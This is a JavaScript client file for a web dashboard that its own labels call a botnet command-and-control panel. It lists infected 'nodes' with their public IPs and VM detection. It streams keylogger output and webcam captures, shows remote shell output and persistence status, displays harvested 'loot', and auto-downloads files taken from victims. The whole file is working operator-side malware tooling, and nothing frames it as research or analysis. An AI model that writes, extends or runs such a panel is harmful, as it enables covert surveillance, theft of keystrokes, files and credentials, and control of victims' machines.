const $ = (id) => document.getElementById(id);

let socket = null,
	currentNodes = [],
	currentUser = null,
	currentTargetId = null;
let _streaming = false,
	hidMode = "observe",
	frameCount = 0,
	lastFpsTime = 0,
	pingSentAt = 0;
let chatOpen = false,
	unreadCount = 0,
	_audioCtx = null;
const _apexFrames = {},
	_isRendering = false;
const _lastFrameTs = 0; // For frame delivery latency measurement
const _fileChunks = {}; // Buffer for reassembling chunked file uploads

// â”€â”€ Graph State â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const graphs = { nodes: [], load: [], conn: [] };
const MAX_PTS = 60;
const RTC_ICE = {
	iceServers: [
		{ urls: "stun:stun.l.google.com:19302" },
		{ urls: "stun:stun1.l.google.com:19302" },
		{ urls: "stun:stun2.l.google.com:19302" },
		{ urls: "stun:stun3.l.google.com:19302" },
		{ urls: "stun:stun4.l.google.com:19302" },
	],
};

const chatSound = new Audio("/static/notification.mp3");

// ── Audio state (MRL WARE fix: properly declared) ──
let _micOn = false, _deskOn = false, _audioTabScanned = false;
let _audioCtxs = {}, _audioNext = {}, _audioCompressors = {}, _audioGains = {}, _audioFilters = {};
const nodeConnectSound = new Audio("/static/node_connect.mp3");

// â”€â”€ Admin badge pulse â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
let adminBadgeCount = 0;
function _pulseAdminBadge() {
	adminBadgeCount++;
	const badge = $("adminNavBadge");
	if (badge) {
		badge.textContent = adminBadgeCount;
		badge.style.display = "flex";
	}
}
function clearAdminBadge() {
	adminBadgeCount = 0;
	const badge = $("adminNavBadge");
	if (badge) badge.style.display = "none";
}

// â”€â”€ One-shot system message â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
let sysTimer = null;
function showSystemMsg(msg) {
	// Remove existing system msg
	const existing = document.querySelector(".chat-sys-msg");
	if (existing) existing.remove();
	clearTimeout(sysTimer);
	const stream = $("chatStream");
	if (!stream) return;
	const el = document.createElement("div");
	el.className = "chat-sys-msg";
	el.style.cssText =
		"text-align:center;font-size:.68rem;color:var(--amber);padding:.4rem;font-weight:600;animation:msgIn .2s ease;opacity:1;transition:opacity .5s";
	el.textContent = msg;
	stream.appendChild(el);
	stream.scrollTop = stream.scrollHeight;
	sysTimer = setTimeout(() => {
		el.style.opacity = "0";
		setTimeout(() => el.remove(), 500);
	}, 3000);
}

document.addEventListener("DOMContentLoaded", () => {
	if (window.INITIAL_USER) syncUser(window.INITIAL_USER);
	initWebSocket();
	initGraphs();
	if (typeof initDraggableCam === "function") initDraggableCam();
	if (typeof initDraggablePanel === "function") initDraggablePanel();
	// â”€â”€ Real server stats polling (replaces fake simulation) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
	async function _pollStats() {
		try {
			const r = await fetch("/api/stats");
			if (!r.ok) return;
			const s = await r.json();
			if (s.cpu_pct !== undefined) {
				if ($("statServerLoad")) $("statServerLoad").textContent = `${s.cpu_pct.toFixed(1)}%`;
				if ($("graphLoadVal")) $("graphLoadVal").textContent = `${s.cpu_pct.toFixed(1)}%`;
				pushGraph("load", s.cpu_pct);
			}
			if (s.nodes_online !== undefined && $("liveCount"))
				$("liveCount").textContent = `${s.nodes_online} Online`;
		} catch (_) {}
	}
	_pollStats();
	setInterval(_pollStats, 5000);
});

// â”€â”€ WebSocket â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function initWebSocket() {
	const proto = location.protocol === "https:" ? "wss:" : "ws:";
	const token = window.INITIAL_USER?.id || "";
	setConnState("connecting");
	try {
		socket = new WebSocket(`${proto}//${location.host}/ws?token=${token}`);
		socket.binaryType = "arraybuffer";
	} catch (_e) {
		setConnState("offline");
		setTimeout(initWebSocket, 3000);
		return;
	}

	socket.onopen = () => {
		setConnState("online");
		socket.send(JSON.stringify({ type: "portal", token }));
		logEvent("Secure uplink established.", "ok");
		window.wsHB = setInterval(() => {
			if (socket.readyState === WebSocket.OPEN) {
				pingSentAt = performance.now();
				socket.send(JSON.stringify({ type: "ping" }));
			}
		}, 20000);
	};
	socket.onclose = (e) => {
		setConnState("offline");
		clearInterval(window.wsHB);
		logEvent(`Connection lost (${e.code}). Reconnecting...`, "warn");
		setTimeout(initWebSocket, e.code === 1006 ? 1000 : 3000);
	};
	socket.onerror = () => logEvent("Socket error.", "warn");
	socket.onmessage = (e) => {
		if (e.data instanceof ArrayBuffer) {
			handleBinary(e.data);
			return;
		}
		try {
			handleMsg(JSON.parse(e.data));
		} catch (_) {}
	};
}

function setConnState(s) {
	const dot = $("headerConnDot"),
		txt = $("headerConnStatus");
	if (!dot || !txt) return;
	const states = {
		online: ["", "Elite Uplink Active", "var(--teal)", ""],
		connecting: ["connecting", "Connecting...", "var(--amber)", "connecting"],
		offline: ["offline", "Connection Lost", "var(--red)", "offline"],
	};
	const [cls, label, color] = states[s] || states.offline;
	dot.className = `conn-dot${cls ? ` ${cls}` : ""}`;
	txt.textContent = label;
	txt.style.color = color;
}

// â”€â”€ Messages â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function handleMsg(d) {
	const t = d.t || d.type;
	handleReconResponse(d);
	switch (t) {
		case "devices": {
			currentNodes = d.data || [];
			renderNodes();
			const prevOn = parseInt($("statActiveNodes")?.textContent || "0", 10);
			const on = currentNodes.filter((n) => n.status === "Online").length;
			if (on > prevOn) {
				try {
					nodeConnectSound.currentTime = 0;
					nodeConnectSound.play();
				} catch (_e) {}
				showToast(`ðŸŸ¢ New node connected! (${on} total)`, "ok");
			}
			// If we're currently viewing a node and it just went offline, auto-close
			if (currentTargetId) {
				const viewedNode = currentNodes.find(n => n.id === currentTargetId || n.hostname === currentTargetId);
				if (viewedNode && viewedNode.status !== "Online") {
					showToast("ðŸ”´ Node disconnected â€” closing remote session", "warn");
					_closeRemote();
				}
			}
			if ($("statActiveNodes")) $("statActiveNodes").textContent = on;
			if ($("statTotalNodes"))
				$("statTotalNodes").textContent = currentNodes.length;
			if ($("liveCount")) $("liveCount").textContent = `${on} Online`;
			pushGraph("nodes", on);
			if (d.user && !currentUser) syncUser(d.user);
			break;
		}
		case "chat_history":
			(d.data || []).forEach(renderChat);
			break;
		case "chat_msg": {
			const wrap = $("typingIndicator");
			if (wrap) wrap.classList.remove("active");
			renderChat(d);
			if (!chatOpen && d.username !== currentUser?.username) {
				unreadCount++;
				const u = $("chatUnread");
				if (u) {
					u.style.display = "flex";
					u.textContent = unreadCount;
				}
				try {
					chatSound.play();
				} catch (_e) {}
			}
			break;
		}
		case "chat_del": {
			const msgEl = document.getElementById(`chat-msg-${d.id}`);
			if (msgEl) {
				msgEl.style.transition = "opacity .3s";
				msgEl.style.opacity = "0";
				setTimeout(() => msgEl.remove(), 300);
			}
			showSystemMsg("Message deleted by Admin");
			break;
		}
		case "typing":
			if (d.username !== currentUser?.username) showTypingIndicator(d);
			break;
		case "ping":
			if (d.stats) {
				const s = d.stats;
				// Update Info Tab Stats
				const cpuEl = $("statNodeCpu");
				const ramEl = $("statNodeRam");
				const diskEl = $("statNodeDisk");
				if (cpuEl) {
					cpuEl.textContent = s.cpu != null ? `${Math.round(s.cpu)}%` : "â€”";
					cpuEl.style.color = s.cpu > 80 ? "var(--red)" : s.cpu > 50 ? "var(--amber)" : "var(--accent)";
					_updateStatBar("statNodeCpuBar", s.cpu);
				}
				if (ramEl) {
					ramEl.textContent = s.ram != null ? `${Math.round(s.ram)}%` : "â€”";
					ramEl.style.color = s.ram > 85 ? "var(--red)" : s.ram > 60 ? "var(--amber)" : "var(--violet)";
					_updateStatBar("statNodeRamBar", s.ram);
				}
				if (diskEl) {
					diskEl.textContent = s.disk != null ? `${Math.round(s.disk)}%` : "â€”";
					_updateStatBar("statNodeDiskBar", s.disk);
				}
				if ($("statNodeWin") && s.windows != null) {
					$("statNodeWin").textContent = s.windows;
				}
			}
			// Fallthrough for latency calc
		case "pong":
			if (pingSentAt) {
				const ms = Math.round(performance.now() - pingSentAt);
				if ($("remoteLatency")) $("remoteLatency").textContent = `${ms}ms`;
				pingSentAt = 0;
			}
			// Echo pong back to agent with timestamp for adaptive quality RTT
			if (socket?.readyState === WebSocket.OPEN && currentTargetId) {
				socket.send(
					JSON.stringify({
						type: "pong",
						ts: Date.now() / 1000,
						id: currentTargetId,
					}),
				);
			}
			break;

		case "ps_resp": {
			const psEl = $("psResult");
			if (psEl && d.data) {
				// Group processes by name
				const groups = {};
				d.data.forEach((p) => {
					const n = p.name || "unknown";
					if (!groups[n]) groups[n] = [];
					groups[n].push(p);
				});
				const names = Object.keys(groups).sort((a, b) => {
					// Sort by total memory desc
					const memA = groups[a].reduce(
						(s, p) => s + parseFloat(p.mem || 0),
						0,
					);
					const memB = groups[b].reduce(
						(s, p) => s + parseFloat(p.mem || 0),
						0,
					);
					return memB - memA;
				});
				let tbl = `<table style='width:100%;border-collapse:collapse;font-family:JetBrains Mono,monospace'>
<thead><tr style='background:rgba(255,255,255,0.05);font-size:.58rem;text-transform:uppercase;letter-spacing:.06em;color:var(--text-3)'>
<th style='padding:.4rem .5rem;text-align:left'>Name</th>
<th style='padding:.4rem .5rem;text-align:left'>PIDs</th>
<th style='padding:.4rem .3rem;text-align:right'>Mem</th>
<th style='padding:.4rem .3rem'>Control</th></tr></thead><tbody>`;
				names.forEach((name) => {
					const procs = groups[name];
					const totalMem = procs
						.reduce((s, p) => s + parseFloat(p.mem || 0), 0)
						.toFixed(1);
					const pids = procs.map((p) => p.pid).join(", ");
					const count =
						procs.length > 1
							? ` <span style='background:rgba(79,140,255,.2);color:var(--accent);border-radius:4px;padding:0 .3rem;font-size:.55rem'>${procs.length}</span>`
							: "";
					const killBtns = procs
						.map((p) => {
							return `
                            <div style="display:flex;gap:2px;justify-content:center;margin-bottom:2px">
                                <span style="font-size:0.5rem;color:var(--text-3);width:30px">${p.pid}</span>
                                <button type="button" onclick="sendCmd('ps_suspend',{pid:${p.pid}})" title='Suspend' style='background:rgba(251,191,36,0.1);border:1px solid rgba(251,191,36,0.2);color:#fbbf24;border-radius:4px;padding:.1rem .3rem;cursor:pointer;font-size:.5rem'>â¸</button>
                                <button type="button" onclick="sendCmd('ps_resume',{pid:${p.pid}})" title='Resume' style='background:rgba(16,185,129,0.1);border:1px solid rgba(16,185,129,0.2);color:#10b981;border-radius:4px;padding:.1rem .3rem;cursor:pointer;font-size:.5rem'>â–¶</button>
                                <button type="button" onclick="killProcess(${p.pid})" title='Kill' style='background:rgba(248,113,113,0.15);border:1px solid rgba(248,113,113,.3);color:#f87171;border-radius:4px;padding:.1rem .3rem;cursor:pointer;font-size:.5rem'>âœ•</button>
                            </div>`;
						})
						.join("");
					tbl += `<tr style='border-bottom:1px solid rgba(255,255,255,.04);transition:background .15s' onmouseenter="this.style.background='rgba(255,255,255,.03)'" onmouseleave="this.style.background=''">
<td style='padding:.3rem .5rem;font-size:.62rem;color:var(--text-1);max-width:130px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap' title='${name}'>${name}${count}</td>
<td style='padding:.3rem .5rem;font-size:.56rem;color:var(--text-3);max-width:80px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap' title='${pids}'>${pids}</td>
<td style='padding:.3rem .5rem;font-size:.6rem;color:var(--text-3);text-align:right'>${totalMem} MB</td>
<td style='padding:.3rem .3rem;text-align:center;white-space:nowrap'>${killBtns}</td></tr>`;
				});
				psEl.innerHTML = `${tbl}</tbody></table>`;
			}
			break;
		}
		case "audit_log":
			if (typeof prependAuditRow === "function") prependAuditRow(d.data);
			logEvent(
				`[${d.data.category}] ${d.data.username} â†’ ${d.data.action}${d.data.detail ? ` : ${d.data.detail.substring(0, 60)}` : ""}`,
				d.data.level === "warn"
					? "warn"
					: d.data.level === "error"
						? "err"
						: "info",
			);
			break;
		case "keylog_data":
		case "keylog": {
			const kl = d.data || d.text || "";
			logEvent(`[KEYLOG] ${kl}`, "warn");
			const klOut = $("klOutput");
			if (klOut) {
				klOut.textContent += kl;
				klOut.scrollTop = klOut.scrollHeight;
			}
			break;
		}
		case "audio_devices":
			handleAudioDevices(d);
			break;
		case "rtc_answer":
		case "rtc_ice":
			handleRtcSignal(d);
			break;
		case "info":
			logEvent(d.msg || d.data || "");
			// Show in tool result panel if tools tab is active
			if (d.msg) {
				if (d.msg.includes("Persistence Status:")) {
					const pb = $("persistBadge");
					const pbt = $("persistBadgeText");
					if (pb && pbt) {
						pb.style.display = "flex";
						if (d.msg.includes("ACTIVE")) {
							pb.style.background = "rgba(16,185,129,0.1)";
							pb.style.borderColor = "var(--teal)";
							pbt.style.color = "var(--teal)";
							pbt.textContent = "Persistent Access";
							pb.querySelector("div").style.background = "var(--teal)";
							pb.querySelector("div").style.boxShadow = "0 0 8px var(--teal)";
						} else {
							pb.style.background = "rgba(255,179,0,0.1)";
							pb.style.borderColor = "var(--amber)";
							pbt.style.color = "var(--amber)";
							pbt.textContent = "Volatile Access";
							pb.querySelector("div").style.background = "var(--amber)";
							pb.querySelector("div").style.boxShadow = "0 0 8px var(--amber)";
						}
					}
				}
				showToolResult("Info", d.msg);
			}
			break;
		case "webcam_img": {
			showToolResult(
				"Apex Surveillance: Webcam Capture",
				`<div style="text-align:center;padding:10px;"><img src="data:image/jpeg;base64,${d.data}" style="max-width:100%;border:2px solid var(--accent);border-radius:12px;box-shadow:0 0 30px var(--accent-glow);"></div>`,
				true,
			);
			break;
		}
		case "shell_out":
		case "shell_result": {
			const txt = d.data || d.output || d.msg || "";
			logEvent(`[SHELL] ${txt.substring(0, 200)}`, "info");
			// Try shell output box first, fallback to smart tool result panel
			const shellEl = $("shellOutput");
			if (
				shellEl?.closest('[style*="display: block"], [style*="display:block"]')
			) {
				shellEl.textContent = txt;
				shellEl.scrollTop = shellEl.scrollHeight;
			} else {
				showToolResult("Shell Output", txt);
			}
			break;
		}
		case "file_data": {
			// Auto-download file to operator's browser
			try {
				const bytes = atob(d.data);
				const arr = new Uint8Array(bytes.length);
				for (let i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);
				const blob = new Blob([arr]);
				const url = URL.createObjectURL(blob);
				const a = document.createElement("a");
				a.href = url;
				a.download = d.name || "file";
				document.body.appendChild(a);
				a.click();
				setTimeout(() => {
					URL.revokeObjectURL(url);
					a.remove();
				}, 2000);
				logEvent(
					`ðŸ“¥ Received: ${d.name} (${(bytes.length / 1024).toFixed(1)} KB)`,
					"ok",
				);
			} catch (e) {
				logEvent(`file_data error: ${e}`, "err");
			}
			break;
		}
		case "file_download": {
			// File from node â€” auto-download to browser
			try {
				const b64 = d.b64 || d.data;
				const bytes = atob(b64);
				const arr = new Uint8Array(bytes.length);
				for (let i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);
				const blob = new Blob([arr]);
				const url = URL.createObjectURL(blob);
				const a = document.createElement("a");
				a.href = url;
				a.download = d.name || "download";
				document.body.appendChild(a);
				a.click();
				setTimeout(() => { URL.revokeObjectURL(url); a.remove(); }, 2000);
				showToast(`ðŸ“¥ Downloaded: ${d.name || "file"} (${(bytes.length/1024).toFixed(1)}KB)`, "teal");
				logEvent(`ðŸ“¥ File download: ${d.name} (${(bytes.length/1024).toFixed(1)}KB)`, "ok");
			} catch (e) {
				logEvent(`file_download error: ${e}`, "err");
			}
			break;
		}
		case "fs_resp": {
			// File explorer directory listing
			if (typeof window._fsRenderDir === "function") {
				window._fsRenderDir(d);
			}
			break;
		}
		case "loot_resp": {
			const lootEl = $("lootResult");
			if (lootEl) {
				lootEl.innerHTML = d.data || "No loot data found.";
				setRemoteTab("loot");
			}
			showToast("ðŸ’Ž Intelligence Harvested!", "amber");
			break;
		}
		case "file_chunk": {
			// Reassemble chunked large file uploads
			try {
				const key = d.name;
				if (!_fileChunks[key])
					_fileChunks[key] = { chunks: new Array(d.total), received: 0 };
				_fileChunks[key].chunks[d.seq] = d.data;
				_fileChunks[key].received++;
				logEvent(`ðŸ“¦ ${d.name}: chunk ${d.seq + 1}/${d.total}`, "info");
				if (_fileChunks[key].received === d.total) {
					// All chunks received â€” reassemble and download
					const joined = _fileChunks[key].chunks.join("");
					const bytes = atob(joined);
					const arr = new Uint8Array(bytes.length);
					for (let i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);
					const blob = new Blob([arr]);
					const url = URL.createObjectURL(blob);
					const a = document.createElement("a");
					a.href = url;
					a.download = d.name;
					document.body.appendChild(a);
					a.click();
					setTimeout(() => {
						URL.revokeObjectURL(url);
						a.remove();
					}, 2000);
					delete _fileChunks[key];
					logEvent(
						`ðŸ“¥ Received (chunked): ${d.name} (${(bytes.length / 1024 / 1024).toFixed(1)} MB)`,
						"ok",
					);
				}
			} catch (e) {
				logEvent(`file_chunk error: ${e}`, "err");
			}
			break;
		}
		case "dir_list":
			renderDirList(d);
			break;
		case "active_window":
			_handleActiveWindow(d);
			break;
		case "node_stats": {
			// Update the master node list
			const node = currentNodes.find(n => n.id === d.id);
			if (node) {
				node.lastCpu = d.cpu;
				node.lastRam = d.ram;
			}
			
			// Update the grid card if visible
			const cpuText = $(`node-cpu-${d.id}`);
			const ramText = $(`node-ram-${d.id}`);
			if (cpuText) cpuText.textContent = d.cpu != null ? `${Math.round(d.cpu)}%` : "â€”";
			if (ramText) ramText.textContent = d.ram != null ? `${Math.round(d.ram)}%` : "â€”";
			
			const cpuFill = document.querySelector(`#health-cpu-${d.id} .health-fill`);
			const ramFill = document.querySelector(`#health-ram-${d.id} .health-fill`);
			if (cpuFill) cpuFill.style.width = `${d.cpu || 0}%`;
			if (ramFill) ramFill.style.width = `${d.ram || 0}%`;

			// Update the remote modal stats if this is the current target
			if (currentTargetId === d.id) {
				const cpuEl = $("statNodeCpu");
				const ramEl = $("statNodeRam");
				const winEl = $("statNodeWin");
				if (cpuEl) cpuEl.textContent = d.cpu != null ? `${Math.round(d.cpu)}%` : "â€”";
				if (ramEl) ramEl.textContent = d.ram != null ? `${Math.round(d.ram)}%` : "â€”";
				if (winEl) winEl.textContent = d.windows != null ? d.windows : "â€”";
				
				if (cpuEl && d.cpu != null) {
					cpuEl.style.color = d.cpu > 80 ? "var(--red)" : d.cpu > 50 ? "var(--amber)" : "var(--accent)";
				}
				
				_updateStatBar("statNodeCpu", d.cpu);
				_updateStatBar("statNodeRam", d.ram);
			}
			break;
		}
		case "reg_list": {
			if (typeof window._regRender === "function") window._regRender(d);
			break;
		}
	}
}

// Restore _promptBrowse hook
window._promptBrowse = function() {
	if (currentTargetId) {
		window.openFileExplorer(currentTargetId, "C:\\");
	} else if (typeof _origPromptBrowse === "function") {
		_origPromptBrowse();
	}
};

// Helper: update or create a mini progress bar under a stat display
function _updateStatBar(idOrParent, pct) {
	// Try direct bar ID first (e.g. statNodeCpuBar)
	let bar = $(idOrParent + "Bar") || $(idOrParent);
	if (!bar || pct == null) return;
	
	// If it's a fill div (new explicit ID style), update it. 
	// Otherwise (legacy style), find the fill within the parent's track.
	if (bar.classList.contains("stat-mini-bar-fill")) {
		bar.style.width = `${Math.max(2, Math.min(100, pct))}%`;
	} else {
		const track = bar.parentElement.querySelector(".stat-mini-bar");
		const fill = track ? track.querySelector(".stat-mini-bar-fill") : null;
		if (fill) fill.style.width = `${Math.max(2, Math.min(100, pct))}%`;
	}
}

function renderDirList(d) {
	const out = $("toolsResult");
	const wrap = $("toolsResultWrap");
	if (!out) return;

	// Calculate parent path for the "Up" button
	let parentPath = "C:\\\\";
	if (d.path?.includes("\\")) {
		const parts = d.path.replace(/\\$/, "").split("\\");
		parts.pop();
		if (parts.length > 0) {
			parentPath = parts.join("\\");
			if (parentPath.length === 2 && parentPath.endsWith(":"))
				parentPath += "\\";
		}
	}

	let html = `<div style="font-size:.65rem;color:var(--text-3);margin-bottom:.4rem;border-bottom:1px solid var(--border);padding-bottom:.2rem;">ðŸ“ ${d.path}</div>`;

	// Add "Up" directory button
	html += `<div style="padding:.2rem 0;font-size:.7rem;cursor:pointer;color:var(--text-1);font-weight:bold"
                  onclick="browseDir('${parentPath.replace(/\\/g, "\\\\")}')"
             >â¬†ï¸ .. (Go Up)</div>`;

	(d.entries || []).forEach((e) => {
		const icon = e.is_dir ? "ðŸ“" : "ðŸ“„";
		const sz = e.is_dir
			? ""
			: ` <span style="color:var(--text-3)">${(e.size / 1024).toFixed(1)}KB</span>`;
		// Only directories are clickable to browse deeper
		if (e.is_dir) {
			html += `<div style="padding:.15rem 0;font-size:.7rem;cursor:pointer;color:var(--text-2)"
                          onclick="browseDir('${(`${d.path}\\\\${e.name}`).replace(/\\/g, "\\\\")}')"
                     >${icon} ${e.name}${sz}</div>`;
		} else {
			html += `<div style="padding:.15rem 0;font-size:.7rem;color:var(--text-3)"
                     >${icon} ${e.name}${sz}</div>`;
		}
	});
	out.innerHTML = html;

	// Ensure the smart result wrapper is visible and labelled
	if (wrap) wrap.style.display = "block";
	const lbl = $("toolsResultLabel");
	if (lbl) lbl.textContent = "File Explorer";
	out.scrollTop = 0;
}
function _setQuality(q) {
	if (!socket || !currentTargetId) return;
	socket.send(
		JSON.stringify({ type: "set_quality", quality: q, id: currentTargetId }),
	);
}
function browseDir(path) {
	if (!socket || !currentTargetId) return;
	socket.send(JSON.stringify({ type: "dir_list", path, id: currentTargetId }));
}

// â”€â”€ User Sync â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function syncUser(u) {
	currentUser = u;
	const init = $("userInitials"),
		img = $("userAvatarImg");
	if (init) init.textContent = (u.username || "?").charAt(0).toUpperCase();
	const av = u.metadata?.avatar || u.avatar_url || "";
	if (av && img) {
		img.src = av;
		img.style.display = "block";
		if (init) init.style.display = "none";
	}
	if ($("userRole"))
		$("userRole").textContent = (u.role || "user").toUpperCase();
	if ($("userRoleBadge")) {
		$("userRoleBadge").textContent =
			u.role === "admin" ? "OWNER/ADMIN" : "Operator";
		$("userRoleBadge").className =
			`badge ${u.role === "admin" ? "badge-amber" : "badge-violet"}`;
	}
	if (u.role === "admin" && $("adminNavLink")) {
		$("adminNavLink").style.display = "flex";
	}
	if ($("userRoleUnder")) $("userRoleUnder").textContent = u.role || "User";
}

// â”€â”€ Views â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function _showView(v) {
	["overview", "logs", "admin", "map", "vault"].forEach((id) => {
		const el = $(`view-${id}`);
		if (el) el.style.display = id === v ? "block" : "none";
	});
	document.querySelectorAll(".nav-link").forEach((l) => {
		const onclick = l.getAttribute("onclick") || "";
		l.classList.toggle("active", onclick.includes(`'${v}'`));
	});
	const T = {
		overview: ["Global C2 Operations", "Overview"],
		logs: ["Live Forensic Telemetry", "Event Logs"],
		admin: ["Security Operations", "Admin Vault"],
		map: ["World Intelligence", "Node Map"],
		vault: ["Centralized Botnet Exfiltration Database", "The Vault"],
	};
	if (T[v]) {
		if ($("topEyebrow")) $("topEyebrow").textContent = T[v][0];
		if ($("topTitle")) $("topTitle").textContent = T[v][1];
	}
	if (v === "admin") {
		clearAdminBadge();
		adminLoadUsers();
		adminLoadNodeAccess();
	}
	if (v === "vault") {
		if(typeof fetchVaultData === "function") fetchVaultData();
	}
	if (v === "logs") {
		if (typeof loadAuditLogs === "function") loadAuditLogs();
	}
	if (v === "map") {
		renderMapPins(); // This will init leafletMap if it doesn't exist
		setTimeout(() => {
			if (leafletMap) leafletMap.invalidateSize(true);
		}, 200);
	}
}

// â”€â”€ NODE RENDERING â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function renderNodes() {
	const grid = $("nodeGrid");
	if (!grid) return;
	if (!currentNodes.length) {
		grid.innerHTML =
			'<div style="grid-column:1/-1;text-align:center;padding:4rem;color:var(--text-3);font-size:.88rem">No nodes connected</div>';
		return;
	}
	grid.innerHTML = "";
	grid.classList.add("stagger-in"); // Add animation class
	renderMapPins();
	const prevIds = new Set(
		[...grid.querySelectorAll(".node-card")].map(c => c.dataset.nodeId)
	);
	currentNodes.forEach((n, _idx) => {
		const s = n.specs || n;
		const active = n.status === "Online";
		const el = document.createElement("div");
		el.className = `node-card${active ? " active" : ""}`;
		el.onclick = () => openRemote(n.id, n);
		// Mark as new if it wasn't in the grid before
		if (!prevIds.has(n.id)) el.classList.add("node-new");

		const monitors = s.monitors || 0;
		const cameras = s.cameras || 0;
		const flag = s.flag || "";
		const region = s.region || s.country || "Unknown";

		let displayId = n.id;
		if (s.hostname) {
			displayId = s.hostname;
		}

		const publicIp = s.public_ip || s.ipv4 || "Unknown";
		const localIp = s.local_ip || "â€”";

		const isPrivate = Array.isArray(n.allowed_users);
		const canManage = currentUser?.role === "admin";

		el.innerHTML = `
<div class="node-header">
    <div class="node-avatar">${(displayId || "?").charAt(0).toUpperCase()}</div>
    <div style="flex-grow:1;min-width:0">
        <div class="node-hostname">${displayId}</div>
        <div style="font-size:.62rem;color:var(--text-3);margin-top:1px">${publicIp}</div>
    </div>
    <div style="display:flex;flex-direction:column;align-items:flex-end;gap:4px">
        <span class="badge ${active ? "badge-teal" : "badge-red"}" style="flex-shrink:0">${active ? "â— ONLINE" : "â—‹ OFFLINE"}</span>
        ${isPrivate ? `<span class="badge badge-amber" style="font-size:0.5rem;padding:1px 4px">ðŸ”’ PRIVATE</span>` : ""}
    </div>
</div>
<div class="node-media-row">
    <div class="media-chip">ðŸ–¥ <span style="font-weight:700">${monitors}</span></div>
    <div class="media-chip">ðŸ“· <span style="font-weight:700">${cameras}</span></div>
    ${flag ? `<div class="media-chip">${flag} <span>${region}</span></div>` : ""}
    ${canManage ? `<button type="button" class="btn-ghost" style="padding:2px 6px;font-size:0.55rem;margin-left:auto" onclick="event.stopPropagation(); adminToggleNodePublic('${n.id}', ${!isPrivate})">${isPrivate ? "ðŸ”“ MAKE PUBLIC" : "ðŸ”’ MAKE PRIVATE"}</button>` : ""}
</div>
<div class="node-specs-grid">
    <div class="spec-row"><span class="spec-key">OS</span><span class="spec-val">${s.os || "â€”"}</span></div>
    <div class="spec-row"><span class="spec-key">CPU</span><span class="spec-val" id="node-cpu-${n.id}">${n.lastCpu != null ? Math.round(n.lastCpu) + '%' : s.cpu || "â€”"}</span></div>
    <div class="spec-row"><span class="spec-key">RAM</span><span class="spec-val" id="node-ram-${n.id}">${n.lastRam != null ? Math.round(n.lastRam) + '%' : s.ram || "â€”"}</span></div>
    <div class="spec-row"><span class="spec-key">IP</span><span class="spec-val" style="color:var(--accent)">${publicIp}</span></div>
    <div class="spec-row"><span class="spec-key">LOCAL</span><span class="spec-val">${localIp}</span></div>
    <div class="spec-row"><span class="spec-key">VM</span><span class="spec-val ${s.vm === "Detected" ? "red" : ""}">${s.vm || "Unknown"}</span></div>
    <div class="spec-row" style="grid-column:1/-1; display:flex; gap:8px; margin-top:4px;">
        <div class="health-badge" id="health-cpu-${n.id}" style="flex:1; height:4px; background:rgba(255,255,255,0.05); border-radius:2px; overflow:hidden;">
            <div class="health-fill" style="width:${n.lastCpu || 0}%; height:100%; background:var(--accent); transition: width 0.5s;"></div>
        </div>
        <div class="health-badge" id="health-ram-${n.id}" style="flex:1; height:4px; background:rgba(255,255,255,0.05); border-radius:2px; overflow:hidden;">
            <div class="health-fill" style="width:${n.lastRam || 0}%; height:100%; background:var(--violet); transition: width 0.5s;"></div>
        </div>
    </div>
</div>`;
		grid.appendChild(el);
	});
}

